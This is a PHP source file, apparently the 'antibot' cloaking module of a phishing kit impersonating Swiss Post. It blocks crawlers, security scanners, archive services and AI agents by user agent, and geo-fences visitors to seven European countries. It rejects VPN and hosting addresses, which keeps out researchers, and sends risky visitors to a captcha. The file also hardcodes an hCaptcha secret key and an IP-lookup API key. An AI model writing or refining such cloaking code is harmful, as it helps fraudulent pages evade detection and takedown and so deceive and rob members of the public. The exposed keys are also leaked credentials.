<?php
/**
 * Security & Antibot System - SWISS POST
 * Pays: CH, DE, FR, AT, LI, BE, LU
 */

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once dirname(__DIR__) . '/config.php';

define('HCAPTCHA_SITE_KEY', 'e626ae96-b980-415e-a1d0-5f6ad926e30c');
define('HCAPTCHA_SECRET_KEY', 'ES_b2f3fb5406c646a78f18d60a7813a239');
define('CAPTCHA_TIMEOUT', 600);

$allowedCountries = ['CH', 'DE', 'FR', 'AT', 'LI', 'BE', 'LU'];

$botPatterns = [
    'googlebot', 'bingbot', 'yandexbot', 'baidu', 'slurp', 'duckduckbot',
    'crawler', 'spider', 'bot/', 'crawl', 'scraper', 'semrush', 'ahrefs',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'gptbot', 'chatgpt',
    'claude', 'anthropic', 'openai', 'headless', 'phantom', 'selenium',
    'puppeteer', 'playwright', 'curl/', 'wget/', 'python-requests',
    'scrapy', 'httrack', 'archive.org', 'postman', 'insomnia'
];

function blockAccess($reason) {
    $_SESSION['security_passed'] = false;
    $_SESSION['block_reason'] = $reason;
    @file_put_contents(__DIR__ . '/logs/blocked.log',
        date('Y-m-d H:i:s') . " | " . ($_SERVER['REMOTE_ADDR'] ?? '') . " | $reason\n",
        FILE_APPEND
    );
    header('Location: /?s=e&r=' . urlencode($reason));
    exit;
}

function requireCaptcha($reason) {
    if (!empty($_SESSION['captcha_passed']) && !empty($_SESSION['captcha_passed_time'])) {
        if ((time() - $_SESSION['captcha_passed_time']) < CAPTCHA_TIMEOUT) {
            return false;
        }
    }
    $_SESSION['captcha_reason'] = $reason;
    // Use router path instead of direct file path
    $currentPage = $_GET['s'] ?? '1';
    $_SESSION['captcha_redirect'] = '?s=' . $currentPage;
    $_SESSION['captcha_ip'] = getRealIP();
    $_SESSION['captcha_token'] = bin2hex(random_bytes(32));
    header('Location: /?s=v');
    exit;
}

function getRealIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) return $_SERVER['HTTP_X_REAL_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function verifyCaptcha($token) {
    if (empty($token)) return ['success' => false];
    $ch = curl_init('https://hcaptcha.com/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(['secret' => HCAPTCHA_SECRET_KEY, 'response' => $token]),
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    return ['success' => ($data['success'] ?? false) === true];
}

function assessIPRisk($data) {
    $risk = 0;
    $reasons = [];
    if (!empty($data['hosting']) && $data['hosting'] === true) { $risk += 40; $reasons[] = 'hosting'; }
    if (!empty($data['proxy']) && $data['proxy'] === true) { $risk += 30; $reasons[] = 'vpn'; }
    if (!empty($data['mobile']) && $data['mobile'] === true) { $risk += 5; $reasons[] = 'mobile'; }
    if (empty($data['isp']) || strlen($data['isp']) < 3) { $risk += 15; $reasons[] = 'unknown_isp'; }
    return ['risk_score' => $risk, 'reasons' => $reasons];
}

$userIP = getRealIP();

if (in_array($userIP, ['127.0.0.1', '::1', 'localhost'])) {
    $_SESSION['security_passed'] = true;
    $_SESSION['ip_info'] = ['ip' => $userIP, 'countryCode' => 'CH', 'city' => 'Local', 'country' => 'Switzerland'];
    return;
}

if (!empty($_SESSION['security_passed']) && !empty($_SESSION['last_ip'])) {
    if ($_SESSION['last_ip'] === $userIP && (time() - ($_SESSION['security_time'] ?? 0)) < 120) return;
}

if (empty($_SESSION['antibotplot'])) $_SESSION['antibotplot'] = bin2hex(random_bytes(16));

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!empty($userAgent)) {
    $uaLower = strtolower($userAgent);
    foreach ($botPatterns as $pattern) {
        if (strpos($uaLower, $pattern) !== false) blockAccess('bot');
    }
}

$apiUrl = "https://pro.ip-api.com/json/{$userIP}?key=NCx0PDVOcBsh1pQ&fields=66846719";
$ch = curl_init($apiUrl);
curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_TIMEOUT => 10]);
$response = curl_exec($ch);
curl_close($ch);
$data = @json_decode($response, true);

if (!$data || ($data['status'] ?? '') !== 'success') requireCaptcha('api_error');
if (!in_array($data['countryCode'] ?? '', $allowedCountries)) blockAccess('country_' . ($data['countryCode'] ?? 'unknown'));
if (!empty($data['proxy']) && $data['proxy'] === true) blockAccess('vpn');
if (!empty($data['hosting']) && $data['hosting'] === true) blockAccess('hosting');

$riskAssessment = assessIPRisk($data);
$riskScore = $riskAssessment['risk_score'];

$_SESSION['ip_info'] = [
    'ip' => $userIP, 'city' => $data['city'] ?? '', 'country' => $data['country'] ?? '',
    'countryCode' => $data['countryCode'] ?? '', 'isp' => $data['isp'] ?? '',
    'mobile' => $data['mobile'] ?? false, 'risk_score' => $riskScore
];

if ($riskScore >= 15) requireCaptcha('suspicious_ip_' . $riskScore);

$_SESSION['security_passed'] = true;
$_SESSION['security_time'] = time();
$_SESSION['last_ip'] = $userIP;

@file_put_contents(__DIR__ . '/logs/access.log',
    date('Y-m-d H:i:s') . " | $userIP | " . ($data['countryCode'] ?? 'XX') . " | Risk: $riskScore\n", FILE_APPEND);
?>
